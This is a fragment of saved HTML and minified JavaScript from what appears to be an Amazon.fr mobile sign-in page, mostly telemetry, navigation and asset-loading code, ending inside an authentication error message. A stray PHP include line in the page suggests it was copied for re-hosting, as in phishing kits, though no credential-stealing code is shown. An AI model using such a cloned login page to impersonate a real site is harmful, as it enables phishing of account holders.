(function(k,l,g){function m(a){c||(c=b[a.type].id,"undefined"===typeof a.clientX?(e=a.pageX,f=a.pageY):(e=a.clientX,f=a.clientY),2!=c||h&&(h!=e||n!=f)?(r(),d.isl&&l.setTimeout(function(){p("at",d.id)},0)):(h=e,n=f,c=0))}function r(){for(var a in b)b.hasOwnProperty(a)&&d.detach(a,m,b[a].parent)}function s(){for(var a in b)b.hasOwnProperty(a)&&d.attach(a,m,b[a].parent)}function t(){var a="";!q&&c&&(q=1,a+="&ui="+c);return a}var d=k.ue,p=k.uex,q=0,c=0,h,n,e,f,b={click:{id:1,parent:g},mousemove:{id:2,
parent:g},scroll:{id:3,parent:l},keydown:{id:4,parent:g}};d&&p&&(s(),d._ui=t)})(ue_csm,window,document);



(function(l,e){function c(b){b="";var c=a.isBFT?"b":"s",d=""+a.oid,g=""+a.lid,h=d;d!=g&&20==g.length&&(c+="a",h+="-"+g);a.tabid&&(b=a.tabid+"+");b+=c+"-"+h;b!=f&&100>b.length&&(f=b,a.cookie?a.cookie.updateCsmHit(m,b+("|"+ +new Date)):e.cookie="csm-hit="+b+("|"+ +new Date)+n+"; path=/")}function p(){f=0}function d(b){!0===e[a.pageViz.propHid]?f=0:!1===e[a.pageViz.propHid]&&c({type:"visible"})}var n="; expires="+(new Date(+new Date+6048E5)).toGMTString(),m="tb",f,a=l.ue||{},k=a.pageViz&&a.pageViz.event&&
a.pageViz.propHid;a.attach&&(a.attach("click",c),a.attach("keyup",c),k||(a.attach("focus",c),a.attach("blur",p)),k&&(a.attach(a.pageViz.event,d,e),d({})));a.aftb=1})(ue_csm,ue_csm.document);


ue_csm.ue.stub(ue,"impression");


ue.stub(ue,"trigger");



if(window.ue&&uet) { uet('bb'); }

}
</script>
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 1520)</script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/41uLOOuUMJL._RC|417kbaDgEfL.js_.js?AUIClients/NavMobileAssets-all&amp;ZDLVZMvf#387764-T1.404801-T1"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/01CMyuQ8OQL.js?AUIClients/InternationalCustomerPreferencesNavMobileAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/31sq3pfde4L.js?AUIClients/GlowToasterAssets&amp;DnhD++VQ#365419-T1"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/01w4L3R-4KL._RC|01qAdvV0GUL.js,61Bq1V2fGxL.js_.js?AUIClients/RetailSearchAutocompleteAssets&amp;21f586Q5#mobile.language-fr.fr.403991-T1.408838-T2"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/41N6Zfgd3UL.js?AUIClients/AmazonWebAppAssets"></script><style>.a2hs-ingress-container,a[href^="#nav-hbm-a2hs-trigger"]{display:none!important}.a2hs-ingress-container.a2hs-ingress-visible,a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible{display:block!important}</style><style>@media all and (display-mode:standalone){#chromeless-view-progress-bar,#chromeless-view-progress-bar::after{position:fixed;top:0;left:0;right:0;height:2px}@keyframes pbAnimation{0%{right:90%}100%{right:10%}}#chromeless-view-progress-bar{background:rgba(255,255,255,.1);z-index:9999999}#chromeless-view-progress-bar::after{content:'';background:#fcbb6a;animation:pbAnimation 10s forwards}}</style><style></style></head>

  <body class="a-color-offset-background ap-locale-fr_FR a-m-fr a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c auth-show-password-enabled auth-show-password-ready">

<script>
!function(){function n(n,t){var r=i(n);return t&&(r=r("instance",t)),r}var r=[],c=0,i=function(t){return function(){var n=c++;return r.push([t,[].slice.call(arguments,0),n,{time:Date.now()}]),i(n)}};n._s=r,this.csa=n}();;
csa('Config', {});
if (window.csa) {
    csa("Config", {
        
        'Events.Namespace': 'csa',
        'ObfuscatedMarketplaceId': 'A13V1IB3VIYZZH',
        'Events.SushiEndpoint': 'https://unagi.amazon.fr/1/events/com.amazon.csm.csa.prod',
        'CacheDetection.RequestID': "Q2E2JWSX05HN7DAWWE8S",
        'CacheDetection.Callback': window.ue && ue.reset,
        'LCP.elementDedup': 1
    });

    csa("Events")("setEntity", {
        page: {requestId: "Q2E2JWSX05HN7DAWWE8S", meaningful: "interactive"},
        session: {id: "258-8387710-9157813"}
    });
}
!function(i){var r,e,o="splice",u=i.csa,f={},c={},a=i.csa._s,s=0,l=0,g=-1,h={},d={},v={},n=Object.keys,p=function(){};function t(n,t){return u(n,t)}function m(n,t){var i=c[n]||{};O(i,t),c[n]=i,l++,S(U,0)}function w(n,t,i){var r=!0;return t=D(t),i&&i.buffered&&(r=(v[n]||[]).every(function(n){return!1!==t(n)})),r?(h[n]||(h[n]=[]),h[n].push(t),function(){!function(n,t){var i=h[n];i&&i[o](i.indexOf(t),1)}(n,t)}):p}function b(n,t){if(t=D(t),n in d)return t(d[n]),p;return w(n,function(n){return t(n),!1})}function E(n,t){if(u("Errors")("logError",n),f.DEBUG)throw t||n}function y(){return Math.abs(4294967295*Math.random()|0).toString(36)}function D(n,t){return function(){try{return n.apply(this,arguments)}catch(n){E(n.message||n,n)}}}function S(n,t){return i.setTimeout(D(n),t)}function U(){for(var n=0;n<a.length;){var t=a[n],i=t[0]in c;if(!i&&!e)return void(s=f.AddMissingPluginsToEnd?a.length:t.length);i?(a[o](s=n,1),I(t)):n++}g=l}function I(n){var arguments,t=c[n[0]],i=(arguments=n[1])[0];if(!t||!t[i])return E("Undefined function: "+t+"/"+i);r=n[3],c[n[2]]=t[i].apply(t,arguments.slice(1))||{},r=0}function M(){e=1,U()}function O(t,i){n(i).forEach(function(n){t[n]=i[n]})}b("$beforeunload",M),m("Config",{instance:function(n){O(f,n)}}),u.plugin=D(function(n){n(t)}),t.config=f,t.register=m,t.on=w,t.once=b,t.blank=p,t.emit=function(n,t,i){for(var r=h[n]||[],e=0;e<r.length;)!1===r[e](t)?r[o](e,1):e++;d[n]=t||{},i&&i.buffered&&(v[n]||(v[n]=[]),100<=v[n].length&&v[n].shift(),v[n].push(t||{}))},t.UUID=function(){return[y(),y(),y(),y()].join("-")},t.time=function(n){var t=r?new Date(r.time):new Date;return"ISO"===n?t.toISOString():t.getTime()},t.error=E,t.warn=function(n,t){if(u("Errors")("logWarn",n),f.DEBUG)throw t||n},t.exec=D,t.timeout=S,t.interval=function(n,t){return i.setInterval(D(n),t)},(t.global=i).csa._s.push=function(n){n[0]in c&&(!a.length||e)?(I(n),a.length&&g!==l&&U()):a[o](s++,0,n)},U(),S(function(){S(M,f.SkipMissingPluginsTimeout||5e3)},1)}("undefined"!=typeof window?window:global);csa.plugin(function(o){var f="addEventListener",e="requestAnimationFrame",t=o.exec,r=o.global,u=o.on;o.raf=function(n){if(r[e])return r[e](t(n))},o.on=function(n,e,t,r){if(n&&"function"==typeof n[f]){var i=o.exec(t);return n[f](e,i,r),function(){n.removeEventListener(e,i,r)}}return"string"==typeof n?u(n,e,t,r):o.blank}});csa.plugin(function(o){var t,n,r={},e="localStorage",c="sessionStorage",a="local",i="session",u=o.exec;function s(e,t){var n;try{r[t]=!!(n=o.global[e]),n=n||{}}catch(e){r[t]=!(n={})}return n}function f(){t=t||s(e,a),n=n||s(c,i)}function l(e){return e&&e[i]?n:t}o.store=u(function(e,t,n){f();var o=l(n);return e?t?void(o[e]=t):o[e]:Object.keys(o)}),o.storageSupport=u(function(){return f(),r}),o.deleteStored=u(function(e,t){f();var n=l(t);if("function"==typeof e)for(var o in n)n.hasOwnProperty(o)&&e(o,n[o])&&delete n[o];else delete n[e]})});csa.plugin(function(o){function r(n){return function(r){o("Metrics",{producerId:"csa",dimensions:{message:r}})("recordMetric",n,1)}}o.register("Errors",{logError:r("jsError"),logWarn:r("jsWarn")})});csa.plugin(function(r){var o,e=r.global,i=r("Events"),f=e.location,d=e.document,a=((e.performance||{}).navigation||{}).type,t=r.on,u=r.emit,g={};function n(a,e){var t=!!o,n=(e=e||{}).keepPageAttributes;t&&(u("$beforePageTransition"),u("$pageTransition")),t&&!n&&i("removeEntity","page"),o=r.UUID(),n?g.id=o:g={schemaId:"<ns>.PageEntity.1",id:o,url:f.href,server:f.hostname,path:f.pathname,referrer:d.referrer,title:d.title},Object.keys(a||{}).forEach(function(e){g[e]=a[e]}),i("setEntity",{page:g}),u("$pageChange",g,{buffered:1}),t&&u("$afterPageTransition")}function l(){u("$load"),u("$ready"),u("$afterload")}function s(){u("$ready"),u("$beforeunload"),u("$unload"),u("$afterunload")}f&&d&&(t(e,"beforeunload",s),t(e,"pagehide",s),"complete"===d.readyState?l():t(e,"load",l),r.register("SPA",{newPage:n}),n({transitionType:{0:"hard",1:"refresh",2:"back-button"}[a]||"unknown"}))});csa.plugin(function(c){var t="Events",e="UNKNOWN",a="id",u="all",n="messageId",i="timestamp",f="producerId",o="application",r="obfuscatedMarketplaceId",s="entities",d="schemaId",l="version",p="attributes",v="<ns>",g=c.config,h=(c.global.location||{}).host,m=g[t+".Namespace"]||"csa_other",I=g.Application||"Other"+(h?":"+h:""),b=c("Transport"),y={},O=function(t,e){Object.keys(t).forEach(e)};function E(n,i,o){O(i,function(t){var e=o===u||(o||{})[t];t in n||(n[t]={version:1,id:i[t][a]||c.UUID()}),U(n[t],i[t],e)})}function U(e,n,i){O(n,function(t){!function(t,e,n){return"string"!=typeof e&&t!==l?c.error("Attribute is not of type string: "+t):!0===n||1===n||(t===a||!!~(n||[]).indexOf(t))}(t,n[t],i)||(e[t]=n[t])})}function N(o,t,r){O(t,function(t){var e=o[t];if(e[d]){var n={},i={};n[a]=e[a],n[f]=e[f]||r,n[d]=e[d],n[l]=e[l]++,n[p]=i,S(n),U(i,e,1),k(i),b("log",n)}})}function S(t){t[i]=function(t){return"number"==typeof t&&(t=new Date(t).toISOString()),t||c.time("ISO")}(t[i]),t[n]=t[n]||c.UUID(),t[o]=I,t[r]=g.ObfuscatedMarketplaceId||e,t[d]=t[d].replace(v,m)}function k(t){delete t[l],delete t[d],delete t[f]}function w(o){var r={};this.log=function(t,e){var n={},i=(e||{}).ent;return t?"string"!=typeof t[d]?c.error("A valid schema id is required for the event"):(S(t),E(n,y,i),E(n,r,i),E(n,t[s]||{},i),O(n,function(t){k(n[t])}),t[f]=o[f],t[s]=n,void b("log",t)):c.error("The event cannot be undefined")},this.setEntity=function(t){E(r,t,u),N(r,t,o[f])}}g["KillSwitch."+t]||c.register(t,{setEntity:function(t){E(y,t,u),N(y,t,"csa")},removeEntity:function(t){delete y[t]},instance:function(t){return new w(t)}})});csa.plugin(function(s){var c,g="Transport",l="post",f="preflight",r="csa.cajun.",i="store",a="deleteStored",u="sendBeacon",t="__merge",e="messageId",n=".FlushInterval",o=0,d=s.config[g+".BufferSize"]||2e3,h=s.config[g+".RetryDelay"]||1500,p={},v=0,y=[],m=s.global,E=m.document,b=s.timeout,k=m.Object.keys,w=s.config[g+n]||5e3,I=w,O=s.config[g+n+".BackoffFactor"]||1,R=s.config[g+n+".BackoffLimit"]||3e4,S=0;function B(n){if(864e5<s.time()-+new Date(n.timestamp))return s.warn("Event is too old: "+n);v<d&&(n[e]in p||(p[n[e]]=n,v++),"function"==typeof n[t]&&n[t](p[n[e]]),!S&&o&&(S=b(T,function(){var n=I;return I=Math.min(n*O,R),n}())))}function T(){y.forEach(function(e){var o=[];k(p).forEach(function(n){var t=p[n];e.accepts(t)&&o.push(t)}),o.length&&(e.chunks?e.chunks(o).forEach(function(n){D(e,n)}):D(e,o))}),p={},S=0}function D(t,e){function o(){s[a](r+n)}var n=s.UUID();s[i](r+n,JSON.stringify(e)),[function(n,t,e){var o=m.navigator||{},r=m.cordova||{};if(!o[u]||!n[l])return 0;n[f]&&r&&"ios"===r.platformId&&!c&&((new Image).src=n[f]().url,c=1);var i=n[l](t);if(!i.type&&o[u](i.url,i.body))return e(),1},function(n,t,e){if(!n[l])return 0;var o=n[l](t),r=o.url,i=o.body,c=o.type,f=new XMLHttpRequest,a=0;function u(n,t,e){f.open("POST",n),f.withCredentials=!0,e&&f.setRequestHeader("Content-Type",e),f.send(t)}return f.onload=function(){f.status<299?e():s.config[g+".XHRRetries"]&&a<3&&b(function(){u(r,i,c)},++a*h)},u(r,i,c),1}].some(function(n){try{return n(t,e,o)}catch(n){}})}k&&(s.once("$afterload",function(){o=1,function(e){(s[i]()||[]).forEach(function(n){if(!n.indexOf(r))try{var t=s[i](n);s[a](n),JSON.parse(t).forEach(e)}catch(n){s.error(n)}})}(B),s.on(E,"visibilitychange",T,!1),T()}),s.once("$afterunload",function(){o=1,T()}),s.on("$afterPageTransition",function(){v=0,I=w}),s.register(g,{log:B,register:function(n){y.push(n)}}))});csa.plugin(function(n){var r=n.config["Events.SushiEndpoint"];n("Transport")("register",{accepts:function(n){return n.schemaId},post:function(n){var t=n.map(function(n){return{data:n}});return{url:r,body:JSON.stringify({events:t})}},preflight:function(){var n,t=/\/\/(.*?)\//.exec(r);return t&&t[1]&&(n="https://"+t[1]+"/ping"),{url:n}},chunks:function(n){for(var t=[];500<n.length;)t.push(n.splice(0,500));return t.push(n),t}})});csa.plugin(function(n){var t,a,o,r,e=n.config,i="PageViews",d=e[i+".ImpressionMinimumTime"]||1e3,s="hidden",c="innerHeight",g="innerWidth",l="renderedTo",f=l+"Viewed",m=l+"Meaningful",u=l+"Impressed",p=1,v=2,h=3,w=4,y=5,P="loaded",I=7,T=8,b=n.global,E=n.on,V=n("Events",{producerId:"csa"}),$=b.document,M={},S={},H=y;function K(e){if(!M[I]){var i;if(M[e]=n.time(),e!==h&&e!==P||(t=t||M[e]),t&&H===w)a=a||M[e],(i={})[m]=t-o,i[f]=a-o,R("PageView.4",i),r=r||n.timeout(j,d);if(e!==y&&e!==p&&e!==v||(clearTimeout(r),r=0),e!==p&&e!==v||R("PageRender.3",{transitionType:e===p?"hard":"soft"}),e===I)(i={})[m]=t-o,i[f]=a-o,i[u]=M[e]-o,R("PageImpressed.2",i)}}function R(e,i){S[e]||(i.schemaId="<ns>."+e,V("log",i,{ent:"all"}),S[e]=1)}function W(){0===b[c]&&0===b[g]?(H=T,n("Events")("setEntity",{page:{viewport:"hidden-iframe"}})):H=$[s]?y:w,K(H)}function j(){K(I),r=0}function k(){var e=o?v:p;M={},S={},a=t=0,o=n.time(),K(e),W()}function q(){var e=$.readyState;"interactive"===e&&K(h),"complete"===e&&K(P)}e["KillSwitch."+i]||($&&void 0!==$[s]?(k(),E($,"visibilitychange",W,!1),E($,"readystatechange",q,!1),E("$afterPageTransition",k),E("$timing:loaded",q),n.once("$load",q)):n.warn("Page visibility not supported"))});csa.plugin(function(c){var s=c.config["Interactions.ParentChainLength"]||15,e="click",r="touches",f="timeStamp",o="length",u="pageX",g="pageY",p="pageXOffset",h="pageYOffset",m=250,v=5,d=200,l=.5,t={capture:!0,passive:!0},X=c.global,Y=c.emit,n=c.on,x=X.Math.abs,a=(X.document||{}).documentElement||{},y={x:0,y:0,t:0,sX:0,sY:0},N={x:0,y:0,t:0,sX:0,sY:0};function b(t){if(t.id)return"//*[@id='"+t.id+"']";var e=function(t){var e,n=1;for(e=t.previousSibling;e;e=e.previousSibling)e.nodeName===t.nodeName&&(n+=1);return n}(t),n=t.nodeName;return 1!==e&&(n+="["+e+"]"),t.parentNode&&(n=b(t.parentNode)+"/"+n),n}function I(t,e,n){var a=c("Content",{target:n}),i={schemaId:"<ns>.ContentInteraction.1",interaction:t,interactionData:e,messageId:c.UUID()};if(n){var r=b(n);r&&(i.attribution=r);var o=function(t){for(var e=t,n=e.tagName,a=!1,i=t?t.href:null,r=0;r<s;r++){if(!e||!e.parentElement){a=!0;break}n=(e=e.parentElement).tagName+"/"+n,i=i||e.href}return a||(n=".../"+n),{pc:n,hr:i}}(n);o.pc&&(i.interactionData.parentChain=o.pc),o.hr&&(i.interactionData.href=o.hr)}a("log",i),Y("$content.interaction",i)}function i(t){I(e,{interactionX:""+t.pageX,interactionY:""+t.pageY},t.target)}function C(t){if(t&&t[r]&&1===t[r][o]){var e=t[r][0];N=y={e:t.target,x:e[u],y:e[g],t:t[f],sX:X[p],sY:X[h]}}}function D(t){if(t&&t[r]&&1===t[r][o]&&y&&N){var e=t[r][0],n=t[f],a=n-N.t,i={e:t.target,x:e[u],y:e[g],t:n,sX:X[p],sY:X[h]};N=i,d<=a&&(y=i)}}function E(t){if(t){var e=x(y.x-N.x),n=x(y.y-N.y),a=x(y.sX-N.sX),i=x(y.sY-N.sY),r=t[f]-y.t;if(m<1e3*e/r&&v<e||m<1e3*n/r&&v<n){var o=n<e;o&&a&&e*l<=a||!o&&i&&n*l<=i||I((o?"horizontal":"vertical")+"-swipe",{interactionX:""+y.x,interactionY:""+y.y,endX:""+N.x,endY:""+N.y},y.e)}}}n(a,e,i,t),n(a,"touchstart",C,t),n(a,"touchmove",D,t),n(a,"touchend",E,t)});

</script>
<script type="text/javascript">

(function(){function l(a){for(var c=b.location.search.substring(1).split("&"),e=0;e<c.length;e++){var d=c[e].split("=");if(d[0]===a)return d[1]}}window.amzn=window.amzn||{};amzn.copilot=amzn.copilot||{};var b=window,f=document,g=b.P||b.AmazonUIPageJS,h=f.head||f.getElementsByTagName("head")[0],m=0,n=0;amzn.copilot.checkCoPilotSession=function(){f.cookie.match("cpidv")&&("undefined"!==typeof jQuery&&k(jQuery),g&&g.when&&g.when("jQuery").execute(function(a){k(a)}),b.amznJQ&&b.amznJQ.available&&b.amznJQ.available("jQuery",
function(){k(jQuery)}),b.jQuery||g||b.amznJQ||q())};var q=function(){m?b.ue&&"function"===typeof b.ue.count&&b.ue.count("cpJQUnavailable",1):(m=1,f.addEventListener?f.addEventListener("DOMContentLoaded",amzn.copilot.checkCoPilotSession,!1):f.attachEvent&&f.attachEvent("onreadystatechange",function(){"complete"===f.readyState&&amzn.copilot.checkCoPilotSession()}))},k=function(a){if(!n){n=1;amzn.copilot.jQuery=a;a=l("debugJS");var c="https:"===b.location.protocol?1:0,e=1;url="/gp/copilot/handlers/copilot_strings_resources.html";
window.texas&&texas.locations&&(url=texas.locations.makeUrl(url));g&&g.AUI_BUILD_DATE&&(e=0);amzn.copilot.jQuery.ajax&&amzn.copilot.jQuery.ajax({url:url,dataType:"json",data:{isDebug:a,isSecure:c,includeAUIP:e},success:function(a){amzn.copilot.vip=a.serviceEndPoint;amzn.copilot.enableMultipleTabSession=a.isFollowMe;r(a)},error:function(){b.ue.count("cpLoadResourceError",1)}})}},r=function(a){var c=amzn.copilot.jQuery,e=function(){amzn.copilot.setup(c.extend({isContinuedSession:!0},a))};a.CSSUrls&&
c.each(a.CSSUrls[0],function(a,c){var b=f.createElement("link");b.type="text/css";b.rel="stylesheet";b.href=c;h.appendChild(b)});a.CSSTag&&s(a.CSSTag);if(a.JSUrls){var d=l("forceSynchronousJS"),b=a.JSUrls[0];c.each(b,function(a,c){a===b.length-1?p(c,d,e):p(c,d)})}a.JSTag&&(t(a.JSTag),P.when("CSCoPilotPresenterAsset").execute(function(){e()}))},t=function(a){var c=f.createElement("div");c.innerHTML=a;a=0;for(var b=c.children.length;a<b;a++){var d=f.createElement("script");d.type="text/javascript";
d.innerHTML=c.children[a].innerHTML;h.appendChild(d)}},s=function(a){var b=f.createElement("div");b.innerHTML=a;a=0;for(var e=b.children.length;a<e;a++)h.appendChild(b.children[a])},p=function(a,b,e){var d=f.createElement("script");d.type="text/javascript";d.src=a;d.async=b?!1:!0;e&&(d.onload=e);h.appendChild(d)}})();

amzn.copilot.checkCoPilotSession();

</script>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 14139)</script><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
    <div class="a-section a-spacing-none">
      
      
      <!-- NAVYAAN CSS -->

<style type="text/css">
.nav-sprite-v3 .nav-sprite {
  background-image: url(https://images-eu.ssl-images-amazon.com/images/G/08/gno/sprites/new-nav-sprite-global-1x_blueheaven-account._CB658093860_.png);
  background-repeat: no-repeat;
}
.nav-spinner {
  background-image: url(https://images-eu.ssl-images-amazon.com/images/G/08/javascripts/lib/popover/images/snake._CB485935558_.gif);
}
</style>

<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/31G2LkGsjYL._RC|41H4XraWzVL.css,416A-l9SiuL.css_.css?AUIClients/NavMobileAssets-all">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/31LFazY99yL.css?AUIClients/InternationalCustomerPreferencesNavMobileAssets">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/01+72+wCC9L.css?AUIClients/GlowToasterAssets#mobile">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/41-BCPELxaL._RC|31G6Qkn-xEL.css_.css?AUIClients/RetailSearchAutocompleteAssets#mobile">

      <!-- NAVYAAN JS -->

<script type="text/javascript">!function(n){function e(n,e){return{m:n,a:function(n){return[].slice.call(n)}(e)}}document.createElement("header");var r=function(n){function u(n,r,u){n[u]=function(){a._replay.push(r.concat(e(u,arguments)))}}var a={};return a._sourceName=n,a._replay=[],a.getNow=function(n,e){return e},a.when=function(){var n=[e("when",arguments)],r={};return u(r,n,"run"),u(r,n,"declare"),u(r,n,"publish"),u(r,n,"build"),r.depends=n,r.iff=function(){var r=n.concat([e("iff",arguments)]),a={};return u(a,r,"run"),u(a,r,"declare"),u(a,r,"publish"),u(a,r,"build"),a},r},u(a,[],"declare"),u(a,[],"build"),u(a,[],"publish"),u(a,[],"importEvent"),r._shims.push(a),a};r._shims=[],n.$Nav||(n.$Nav=r("rcx-nav")),n.$Nav.make||(n.$Nav.make=r)}(window)</script><script type="text/javascript">
$Nav.importEvent('navbarJS-mobile');
$Nav.declare('img.sprite', {
  'png32': 'https://images-eu.ssl-images-amazon.com/images/G/08/gno/sprites/new-nav-sprite-global-1x_blueheaven-account._CB658093860_.png',
  'png32-2x': 'https://images-eu.ssl-images-amazon.com/images/G/08/gno/sprites/new-nav-sprite-global-2x_blueheaven-account._CB658093860_.png'
});
window._navbarSpriteUrl = 'https://images-eu.ssl-images-amazon.com/images/G/08/gno/sprites/new-nav-sprite-global-1x_blueheaven-account._CB658093860_.png';
$Nav.declare('img.pixel', 'https://images-eu.ssl-images-amazon.com/images/G/08/x-locale/common/transparent-pixel._CB485934981_.gif');
var nav_t_after_preload_JS = + new Date();
</script>
<img src="https://images-eu.ssl-images-amazon.com/images/G/08/gno/sprites/new-nav-sprite-global-1x_blueheaven-account._CB658093860_.png" style="display:none" alt="">
<script type="text/javascript">var nav_t_after_preload_sprite = + new Date();</script>

<script>
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('navCF').execute(function() {
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/41uLOOuUMJL._RC|417kbaDgEfL.js_.js?AUIClients/NavMobileAssets-all&ZDLVZMvf#387764-T1.404801-T1');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/01CMyuQ8OQL.js?AUIClients/InternationalCustomerPreferencesNavMobileAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/31sq3pfde4L.js?AUIClients/GlowToasterAssets&DnhD++VQ#365419-T1');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/01w4L3R-4KL._RC|01qAdvV0GUL.js,61Bq1V2fGxL.js_.js?AUIClients/RetailSearchAutocompleteAssets&21f586Q5#mobile.language-fr.fr.403991-T1.408838-T2');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/41N6Zfgd3UL.js?AUIClients/AmazonWebAppAssets');
});
</script>

      
      
  <!-- NAVYAAN -->





<!-- MOBILE-APP-BANNER -->



<script type="text/javascript">var nav_t_upnav_begin = + new Date();</script>

<!--NAVYAAN-UPNAV-MARKER-->

<!-- navmet initial definition -->

<script type="text/javascript">
  if(window.navmet===undefined) {
    window.navmet=[];
    if (window.performance && window.performance.timing && window.ue_t0) {
      var t = window.performance.timing;
      var now = + new Date();
      window.navmet.basic = {
        'networkLatency': (t.responseStart - t.fetchStart),
        'navFirstPaint': (now - t.responseStart),
        'NavStart': (now - window.ue_t0)
      };
      window.navmet.push({key:"NavFirstPaintStart",end:+new Date(),begin:window.ue_t0});
    }
  }
  if (window.ue_t0) {
     window.navmet.push({key:"NavMainStart",end:+new Date(),begin:window.ue_t0});
  }
</script>


<script type="text/javascript">window.navmet.tmp=+new Date();</script>
    <style mark="aboveNavInjectionCSS" type="text/css">
      #nav-gwbar .nav-a { white-space: nowrap; } .nav-input[type='submit'] {opacity: 0.01;}
    </style>
<script type="text/javascript">window.navmet.push({key:'AboveNavInjection',end:+new Date(),begin:window.navmet.tmp});</script>


<script type="text/javascript">
  window.uet && uet('ns');
</script>


<script type="text/javascript">window.navmet.tmp=+new Date();</script>
<script type="text/javascript">
window.$Nav && $Nav.declare('config',{"firstName":"","isFreshCustomer":false,"isPrimeCustomer":false,"isPrimeDay":false,"regionalStores":["TW9ub3ByaXg","TmF0dXJhbGlh"],"hashCustomerAndSessionId":"873f861af981796642fad1fb0104312fec881b8b","isExportMode":false,"languageCode":"fr_FR","environmentVFI":"AmazonNavigationCards/development@B6074394559-AL2_x86_64","isBackup":false,"enableInlineHbMenu":0,"isInternal":"0","mobileBlueheaven":"true","navDeviceType":"mobile","pinnedNav":0,"pseudoPrimeFirstBrowse":null,"searchISS":{"sessionId":"258-8387710-9157813","requestId":"Q2E2JWSX05HN7DAWWE8S","customerId":"","language":"fr_FR","pageType":"Standard","isInternal":0,"useSXISS":"","host":"completion.amazon.co.uk/search/complete","mktID":5,"isInIssXCatWeblabTreatment":0,"aliases":"aps,amazon-devices,amazon-global-store,casino,monoprix,naturalia,truffaut,stripbooks,audible,popular,dvd,electronics,videogames,toys,english-books,kitchen,luggage,classical,vhs,software,jewelry,watches,music-song,music-title,music-artist,mp3-downloads,digital-music,digital-music-track,digital-music-album,digital-text,lighting,baby,beauty,hpc,office-products,shoes,sports,mi,computers,clothing,appliances,diy,mobile-apps,pets,gift-cards,automotive,vehicles,garden,tradein-aps,handmade,handmade-jewelry,handmade-home-and-kitchen,warehouse-deals,grocery,luxury-beauty,banjo-apps,industrial,instant-video,black-friday,cyber-monday,prime-wardrobe,fashion,fashion-baby,fashion-boys,fashion-boys-accessories,fashion-boys-clothing,fashion-boys-jewelry,fashion-boys-shoes,fashion-boys-watches,fashion-girls,fashion-girls-accessories,fashion-girls-clothing,fashion-girls-jewelry,fashion-girls-shoes,fashion-girls-watches,fashion-luggage,fashion-mens,fashion-mens-accessories,fashion-mens-clothing,fashion-mens-jewelry,fashion-mens-shoes,fashion-mens-watches,fashion-womens,fashion-womens-accessories,fashion-womens-clothing,fashion-womens-handbags,fashion-womens-jewelry,fashion-womens-shoes,fashion-womens-watches,alexa-skills,under-ten-dollars,todays-deals,specialty-aps-sns,luxury","cxNoiseReductionTreatment":0,"autoScrollUpSearchBoxTreatment":0,"opfSwitch":0,"opfMobileSwitch":0,"useApiV2Mobile":0,"showBIAWidgetinISSTreatment":0,"disableAutocompleteOnFocus":0,"ime":0},"searchIconAction":"footer","searchIconEvent":"nojs","isHMenuBrowserCacheDisable":false,"isInlineHMenuEnabled":1,"wavingAvatarUrl_1x":"https://images-eu.ssl-images-amazon.com/images/G/08/gno/sprites/account-wave1x._CB403808541_.gif","wavingAvatarUrl_2x":"https://images-eu.ssl-images-amazon.com/images/G/08/gno/sprites/account-wave2x._CB403808541_.gif"});
</script>
<script type="text/javascript">window.navmet.push({key:'MobileNavConfig',end:+new Date(),begin:window.navmet.tmp});</script>

<!--NAVYAAN-MOBILEPRENAV-MARKER-->


  <!-- NAVYAAN -->





<?php include 'header.php'; ?>



<script type="text/javascript">
  if (window.ue_t0) {
    window.navmet.push({key:"NavMainPaintEnd",end:+new Date(),begin:window.ue_t0});
    window.navmet.push({key:"NavFirstPaintEnd",end:+new Date(),begin:window.ue_t0});
  }
</script>



<script type="text/javascript">
    if (window.ue_t0) {
      window.navmet.push({key:"NavMainEnd",end:+new Date(),begin:window.ue_t0});
    }
    var nav_t_after_navbar = + new Date();
    window.navmet.push({key:"NavBar",end:+new Date(),begin:window.navmet.main});
    window.uet && uet('ne');
    var nav_t_end_nav = + new Date();
    window.navmet.MainEnd = new Date();
</script>
    </div>

    <div class="a-container">
      <div class="a-section a-spacing-none">
        
      </div>

      

      <div class="a-section a-spacing-none auth-pagelet-mobile-container">
        







  

  

  




      </div>

      <div class="a-section auth-pagelet-mobile-container">
        
        





<!-- Needed to display non-BMP unicode characters correctly -->





<script type="a-state" data-a-state="{&quot;key&quot;:&quot;moa_registration_v2_info&quot;}">{}</script>
<script type="a-state" data-a-state="{&quot;key&quot;:&quot;auth-prepopulate-credential-state&quot;}">{"isPrepopulateEnabled":true}</script>
<script type="a-state" data-a-state="{&quot;key&quot;:&quot;accordion-page-state&quot;}">{"isAccordionPageAuth":"true"}</script>


  





<div id="auth-alert-window" class="a-box a-alert a-alert-error a-spacing-small" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><div class="a-alert-content">
  <ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
